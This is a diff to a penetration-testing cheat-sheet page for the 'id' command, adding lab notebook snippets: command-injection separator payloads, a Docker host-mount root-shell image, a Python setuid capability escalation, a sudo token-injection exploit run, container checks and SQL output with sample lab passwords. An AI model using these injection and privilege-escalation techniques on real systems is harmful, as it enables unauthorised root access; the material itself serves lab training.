@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=id) · [All tools](/index)
+
 ## Current identity
 
 **Kali / Linux**
@@ -31,8 +33,215 @@ Existing processes may retain earlier groups until a new login.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=id)
+## Notebook recipes
 
-## Learning and original examples
+11 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Linux Privilege Escalation: Full Checklist](/privesc/linux-privesc-checklist)
+<AccordionGroup>
+
+<Accordion title="Show Tables">
+
+### Show Tables
+
+**Attacking SQL Databases: Module Notes**
+
+```text
+mysql> SELECT * FROM users;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
++----+---------------+------------+---------------------+
+4 rows in set (0.00 sec)
+```
+
+</Accordion>
+
+<Accordion title="Command Injection: Quick Reference">
+
+### Command Injection: Quick Reference
+
+**Command Injection: Quick Reference**
+
+```bash
+# separators
+; id
+| id
+|| id
+&& id
+`id`
+$(id)
+%0a id          # newline (URL-encoded)
+```
+
+</Accordion>
+
+<Accordion title="SQL Syntax">
+
+### SQL Syntax
+
+**Common Services: Full Module Reference**
+
+```bash
+mysql> SELECT * FROM users;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
++----+---------------+------------+---------------------+
+```
+
+**Common Services: Full Module Reference**
+
+```cmd
+1> SELECT * FROM users
+2> go
+
+id          username             password         data_of_joining
+----------- -------------------- ---------------- -----------------------
+          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
+          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
+          3 john                 john123!         2020-07-02 11:47:16.000
+          4 tom                  tom123!          2020-07-02 12:23:16.000
+
+(4 rows affected)
+```
+
+</Accordion>
+
+<Accordion title="Linux shell — inspect context">
+
+### Linux shell — inspect context
+
+**Container and Docker checks**
+
+```bash
+id
+cat /proc/1/cgroup
+ls -l /.dockerenv /var/run/docker.sock
+cat /proc/self/status | grep -E 'Cap|Seccomp'
+```
+
+</Accordion>
+
+<Accordion title="Docker">
+
+### Docker
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+latest: Pulling from chrisfosterelli/rootplease
+2de59b831a23: Pull complete 
+354c3661655e: Pull complete 
+91930878a2d7: Pull complete 
+a3ed95caeb02: Pull complete 
+489b110c54dc: Pull complete 
+Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
+Status: Downloaded newer image for chrisfosterelli/rootplease:latest
+
+You should now have a root shell on the host OS
+Press Ctrl-D to exit the docker instance / shell
+
+sh-5.0# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+</Accordion>
+
+<Accordion title="Interesting capabilities">
+
+### Interesting capabilities
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
+
+$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+sh-5.0# id
+uid=0(root) gid=1000(swissky)
+```
+
+</Accordion>
+
+<Accordion title="LXC/LXD">
+
+### LXC/LXD
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+╭─swissky@lab ~  
+╰─$ id
+uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
+```
+
+</Accordion>
+
+<Accordion title="sudo_inject">
+
+### sudo_inject
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+$ sudo whatever
+[sudo] password for user:    
+# Press <ctrl>+c since you don't have the password. 
+# This creates an invalid sudo tokens.
+$ sh exploit.sh
+.... wait 1 seconds
+$ sudo -i # no password required :)
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+</Accordion>
+
+<Accordion title="Converting GPO GUID to Name">
+
+### Converting GPO GUID to Name
+
+**Miscellaneous Misconfigurations**
+
+```powershell
+PS C:\htb> Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
+
+DisplayName      : Disconnect Idle RDP
+DomainName       : INLANEFREIGHT.LOCAL
+Owner            : INLANEFREIGHT\Domain Admins
+Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
+GpoStatus        : AllSettingsEnabled
+Description      :
+CreationTime     : 10/28/2021 3:34:07 PM
+ModificationTime : 4/5/2022 6:54:25 PM
+UserVersion      : AD Version: 0, SysVol Version: 0
+ComputerVersion  : AD Version: 0, SysVol Version: 0
+WmiFilter        :
+```
+
+</Accordion>
+
+<Accordion title="Finding High-Value Users">
+
+### Finding High-Value Users
+
+**Pass the Ticket from Linux**
+
+```bash
+id julio@inlanefreight.htb
+```
+
+</Accordion>
+
+</AccordionGroup>
